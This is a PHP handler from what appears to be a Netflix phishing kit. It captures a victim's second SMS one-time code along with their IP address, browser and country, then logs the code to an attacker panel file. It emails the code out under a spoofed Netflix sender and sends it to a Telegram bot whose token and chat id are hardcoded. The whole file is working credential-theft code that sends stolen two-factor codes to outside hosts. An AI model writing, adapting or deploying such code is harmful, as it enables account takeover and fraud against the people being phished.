<?php
/*
SUPER D
*/
@ini_set('display_errors', 'on');
if(isset($_POST['otp2'])){session_start(); 
require 'detect.php';
include "../../config.php";
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$otp2 = $_POST['otp2'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
//msg for email & telegram "text"
$msg = '
[☡] ------- 📩 SMS v2 📩 ------- [☡]

[📮] Code [📮] = '.$otp2.'

[☡] ------- [#𝙲𝙺𝚁] ------- [☡]
';
//msg for admin panel "html"
$msght = '<tr>
			<td width="80">
			<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">   ' .$IP.'</td>
			<td width="30">
			<p align="center">SMS 2</td>
			<td width="40">
			<p align="center">'.$otp2.'</td>
			<td width="40">
			<p align="center">'.$times.' / '.$date.'</td>
			</font></td></tr>';
$save=fopen("../panel/otp".$namerand.".html", "a+");fwrite($save,$msght);fclose($save);
$subject  = " [ NETFLIX SMS 2 ] / ".$IP." / Super 'D' ";$headers = "From: NETFLIX \r\n";mail($yourmail, $subject, $msg, $headers);include("authentication.php");
    $token = "6495564868:AAGWyZjefsbU-uDi5jdX1fqFmyIy8d32fZE";
    $data = [
    'text' => $msg,
    'chat_id' => '637855559',
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>